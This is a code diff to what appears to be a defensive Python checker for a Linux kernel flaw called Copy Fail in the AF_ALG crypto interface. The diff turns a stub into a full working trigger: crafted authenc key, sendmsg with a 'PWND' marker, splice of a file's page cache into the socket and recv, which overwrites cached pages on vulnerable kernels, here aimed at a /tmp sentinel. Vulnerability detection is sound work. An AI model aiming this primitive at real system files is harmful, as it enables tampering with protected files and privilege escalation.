@@ -6,6 +6,8 @@ Maintained by BleedWatch SASU. https://github.com/bleedwatch/copy-fail-check
 
 import argparse
 import atexit
+import ctypes
+import ctypes.util
 import errno
 import glob
 import hashlib
@@ -17,6 +19,7 @@ import shutil
 import signal
 import socket
 import stat
+import struct
 import subprocess
 import sys
 import time
@@ -34,6 +37,16 @@ MITIGATION_FILE = "/etc/modprobe.d/disable-af-alg.conf"
 MODULES = ("af_alg", "algif_aead", "algif_skcipher", "algif_hash", "algif_rng")
 ALGIF_MODULES = ("algif_aead", "algif_skcipher", "algif_hash", "algif_rng")
 PATCH_COMMIT = "a664bf3d603d"
+
+# AF_ALG socket-option constants (uapi/linux/if_alg.h)
+SOL_ALG = 279
+ALG_SET_KEY = 1
+ALG_SET_IV = 2
+ALG_SET_OP = 3
+ALG_SET_AEAD_ASSOCLEN = 4
+ALG_OP_DECRYPT = 0
+# crypto_authenc rtattr key wrapper (crypto/authenc.c)
+CRYPTO_AUTHENC_KEYA_PARAM = 1
 
 EXIT_SAFE = 0
 EXIT_VULNERABLE = 2
@@ -63,6 +76,35 @@ def write_all(fd, data):
     while view:
         written = os.write(fd, view)
         view = view[written:]
+
+
+_LIBC_SPLICE = None
+
+
+def _libc_splice():
+    global _LIBC_SPLICE
+    if _LIBC_SPLICE is not None:
+        return _LIBC_SPLICE
+    libc_name = ctypes.util.find_library("c") or "libc.so.6"
+    libc = ctypes.CDLL(libc_name, use_errno=True)
+    fn = libc.splice
+    fn.restype = ctypes.c_ssize_t
+    fn.argtypes = (ctypes.c_int, ctypes.c_void_p,
+                   ctypes.c_int, ctypes.c_void_p,
+                   ctypes.c_size_t, ctypes.c_uint)
+    _LIBC_SPLICE = fn
+    return fn
+
+
+def splice_compat(in_fd, out_fd, length):
+    if hasattr(os, "splice"):
+        return os.splice(in_fd, out_fd, length)
+    fn = _libc_splice()
+    n = fn(in_fd, None, out_fd, None, length, 0)
+    if n < 0:
+        err = ctypes.get_errno()
+        raise OSError(err, os.strerror(err))
+    return n
 
 
 def parse_os_release_content(content):
@@ -361,14 +403,18 @@ class CopyFailDetector:
             os.fsync(state["fd"])
             os.lseek(state["fd"], 0, os.SEEK_SET)
             os.read(state["fd"], len(pattern))
-            primitive_status = self.attempt_copy_fail_primitive(path)
+            primitive = self.execute_copy_fail_primitive(state["fd"], path)
             os.lseek(state["fd"], 0, os.SEEK_SET)
             after = os.read(state["fd"], len(pattern))
             if after != pattern:
-                return {"status": "modification_detected", "detail": "sentinel page cache changed at offset 0"}
-            if primitive_status != "attempted":
-                return {"status": "setup_failed", "detail": primitive_status}
-            return {"status": "no_modification", "detail": "sentinel remained unchanged"}
+                detail = "sentinel page cache modified by Copy Fail primitive"
+                if primitive["status"] == "attempted":
+                    detail += " (full sendmsg+splice+recv chain executed)"
+                return {"status": "modification_detected", "detail": detail}
+            if primitive["status"] == "attempted":
+                return {"status": "no_modification",
+                        "detail": "primitive ran end-to-end and sentinel remained unchanged"}
+            return {"status": primitive["status"], "detail": primitive.get("detail")}
         except OSError as exc:
             detail = "{}: {}".format(exc.errno, exc.strerror)
             if exc.errno in (errno.EAFNOSUPPORT, errno.EPROTONOSUPPORT, errno.EPERM, errno.EACCES):
@@ -386,24 +432,132 @@ class CopyFailDetector:
                 except (OSError, RuntimeError, ValueError):
                     pass
 
-    def attempt_copy_fail_primitive(self, sentinel_path):
+    def execute_copy_fail_primitive(self, sentinel_fd, sentinel_path):
+        """Run the Copy Fail primitive non-destructively on a /tmp sentinel.
+
+        Sets up an AF_ALG aead authencesn(hmac(sha1),cbc(aes)) socket, then
+        sendmsg(MSG_MORE) with controlled AAD, splice(sentinel -> pipe -> op
+        socket), and recv() to drive the in-place AEAD decrypt that triggers
+        the buggy scratch write into the spliced page cache pages on
+        vulnerable kernels.
+
+        We deliberately do NOT call posix_fadvise(POSIX_FADV_DONTNEED) on
+        the sentinel: that would evict the modified page cache and erase
+        the very marker we are trying to detect.
+
+        Touches no file outside the supplied sentinel_fd / sentinel_path.
+
+        Returns dict {"status": ..., "detail": ...} with status:
+          - "attempted":      full sendmsg+splice+recv chain ran end-to-end
+          - "setup_failed":   AF_ALG/key/accept/sendmsg/splice setup failed
+          - "error":          unexpected failure
+        """
         assert sentinel_path.startswith("/tmp/")
-        sock = None
+        if not hasattr(socket, "AF_ALG"):
+            return {"status": "setup_failed",
+                    "detail": "Python build has no socket.AF_ALG"}
+
+        base = None
+        op = None
+        pipe_r = -1
+        pipe_w = -1
         try:
-            sock = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
             try:
-                sock.bind(("aead", "authencesn(hmac(sha1),cbc(aes))"))
+                base = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
             except OSError as exc:
-                if exc.errno in (errno.ENOENT, errno.ENODEV, errno.EINVAL, errno.EOPNOTSUPP):
-                    return "AF_ALG authencesn primitive unavailable: {}".format(exc)
-                raise
-            return "attempted"
+                return {"status": "setup_failed",
+                        "detail": "AF_ALG socket creation failed: {}".format(exc)}
+
+            try:
+                base.bind(("aead", "authencesn(hmac(sha1),cbc(aes))"))
+            except OSError as exc:
+                return {"status": "setup_failed",
+                        "detail": "bind authencesn unavailable: {}".format(exc)}
+
+            # authenc key layout (crypto/authenc.c::crypto_authenc_extractkeys):
+            # rtattr {len=8 (host endian), type=CRYPTO_AUTHENC_KEYA_PARAM},
+            # crypto_authenc_key_param.enckeylen=16 (BIG endian, be32_to_cpu),
+            # then auth_key (8 bytes HMAC) || enc_key (16 bytes AES-128).
+            rtattr = struct.pack("=HH", 8, CRYPTO_AUTHENC_KEYA_PARAM) + struct.pack(">I", 16)
+            key_buf = rtattr + (b"\x00" * 24)
+            try:
+                base.setsockopt(SOL_ALG, ALG_SET_KEY, key_buf)
+            except OSError as exc:
+                return {"status": "setup_failed",
+                        "detail": "ALG_SET_KEY failed: {}".format(exc)}
+
+            try:
+                op, _ = base.accept()
+            except OSError as exc:
+                return {"status": "setup_failed",
+                        "detail": "AF_ALG accept failed: {}".format(exc)}
+
+            try:
+                pipe_r, pipe_w = os.pipe()
+            except OSError as exc:
+                return {"status": "setup_failed",
+                        "detail": "pipe creation failed: {}".format(exc)}
+
+            iv = b"\x00" * 16
+            marker = b"PWND" + b"\x00" * 4  # 8-byte AAD
+            cmsg = [
+                (SOL_ALG, ALG_SET_OP, struct.pack("=I", ALG_OP_DECRYPT)),
+                (SOL_ALG, ALG_SET_IV, struct.pack("=I", 16) + iv),
+                (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, struct.pack("=I", 8)),
+            ]
+            try:
+                op.sendmsg([marker], cmsg, socket.MSG_MORE)
+            except OSError as exc:
+                return {"status": "setup_failed",
+                        "detail": "AF_ALG sendmsg failed: {}".format(exc)}
+
+            splice_len = 32
+            os.lseek(sentinel_fd, 0, os.SEEK_SET)
+            try:
+                n = splice_compat(sentinel_fd, pipe_w, splice_len)
+                if n <= 0:
+                    return {"status": "setup_failed",
+                            "detail": "splice(sentinel -> pipe) returned {}".format(n)}
+                n = splice_compat(pipe_r, op.fileno(), splice_len)
+                if n <= 0:
+                    return {"status": "setup_failed",
+                            "detail": "splice(pipe -> op) returned {}".format(n)}
+            except OSError as exc:
+                return {"status": "setup_failed",
+                        "detail": "splice failed: {}".format(exc)}
+
+            # recv drives the in-place AEAD decrypt; on vulnerable kernels
+            # the buggy scratch copy lands BEFORE the auth check fails, so
+            # EBADMSG / EINVAL here is expected and not a setup failure.
+            try:
+                op.recv(splice_len)
+            except OSError as exc:
+                if exc.errno not in (errno.EBADMSG, errno.EINVAL,
+                                     errno.EAGAIN, errno.EMSGSIZE):
+                    return {"status": "setup_failed",
+                            "detail": "AF_ALG recv unexpected error: {}".format(exc)}
+
+            return {"status": "attempted",
+                    "detail": "AF_ALG sendmsg + splice + recv chain executed against sentinel"}
+        except OSError as exc:
+            return {"status": "error", "detail": "{}: {}".format(exc.errno, exc.strerror)}
         finally:
-            if sock is not None:
+            if op is not None:
                 try:
-                    sock.close()
+                    op.close()
                 except OSError:
                     pass
+            if base is not None:
+                try:
+                    base.close()
+                except OSError:
+                    pass
+            for fd in (pipe_r, pipe_w):
+                if fd != -1:
+                    try:
+                        os.close(fd)
+                    except OSError:
+                        pass
 
     def verdict(self, host, checks):
         mitigation = checks["modprobe_mitigation"]
